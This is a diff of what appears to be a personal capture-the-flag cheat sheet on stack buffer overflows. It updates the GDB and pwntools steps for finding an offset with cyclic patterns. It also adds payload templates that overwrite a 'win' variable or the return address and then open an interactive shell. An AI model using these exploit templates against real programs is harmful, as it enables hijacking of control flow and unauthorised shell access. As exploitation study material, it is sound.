@@ -15,7 +15,7 @@ Typical stack layout: If I overwrite the return address I can control where the 
 ## <span style="color:rgb(146, 208, 80)">The Goal:</span>
 Find overflow
      ↓
-Find offset to RIP
+Find offset (variable or RIP)
      ↓
 Control RIP
      ↓
@@ -43,15 +43,16 @@ print(p.recvall().decode())       # read win variable value from output
 offset = cyclic_find(0x????????)  # put win variable value here
 ```
 (If there is a lose_variable, always use `p.send()` not `p.sendline()`)
-
+-
 ## <span style="color:rgb(146, 208, 80)">2- Finding Offset (Return address/RIP overwrite)</span>
-- In terminal:
+- In GDB:
 ```bash
-pwn cyclic 200 | ./binary         # generate pattern, feed it to the program
-# program crashes
-info registers rip  # in GDB, check RIP value
-x/gx $rsp           # return value it crashed at
-cyclic -l <value>   # outputs the offset number
+# In GDB only:
+gdb ./binary
+r <<< $(pwn cyclic 200)       # run with pattern, program crashes
+info registers rip            # check RIP value after crash
+x/gx $rsp                    # if RIP truncated, check RSP
+cyclic -l <value>             # outputs the offset number
 ```
 
 - In Python:
@@ -86,11 +87,17 @@ p = process("./binary")     # local
 offset = 40                 # from cyclic
 win    = 0xdeadbeef         # from GDB
 
-payload  = b"A" * offset    # junk to reach return address
-payload += p64(win)         # overwrite return address (p32(1) --> 01 00 00 00)
+# For variable overwrite:
+payload  = b"A" * offset    # junk to reach variable
+payload += p32(1)           # set win_variable = 1
+p.send(payload)             # send() not sendline()!
+print(p.recvall().decode())
 
-p.sendline(payload)         # or p.send(payload) (new line can cause precision issues)
-p.interactive()             # catch the shell
+# For return address overwrite:
+payload  = b"A" * offset    # junk to reach return address
+payload += p64(win)         # overwrite return address
+p.sendline(payload)
+p.interactive()
 ```
 
 ## <span style="color:rgb(146, 208, 80)">Things that go wrong:</span> 
